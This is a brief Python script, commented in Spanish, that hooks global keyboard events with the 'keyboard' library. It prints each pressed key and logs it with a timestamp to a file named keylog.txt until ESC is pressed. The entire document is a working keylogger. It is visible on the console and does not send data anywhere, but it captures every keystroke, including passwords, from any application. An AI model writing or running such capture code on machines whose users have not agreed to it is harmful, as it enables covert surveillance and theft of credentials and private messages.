import keyboard
import logging
import time
import datetime
import sys

# Configuración del logging
logging.basicConfig(filename="keylog.txt", level=logging.INFO, format="%(asctime)s: %(message)s")

def on_key(event):
    print(f"Tecla presionada: {event.name}")  # Muestra en consola
    logging.info(f"Tecla presionada: {event.name}")  # Guarda en archivo

# Asignar función al presionar cualquier tecla
keyboard.on_press(on_key)

print("Presiona ESC para salir...")
keyboard.wait('esc')  # Espera hasta que se presione ESC
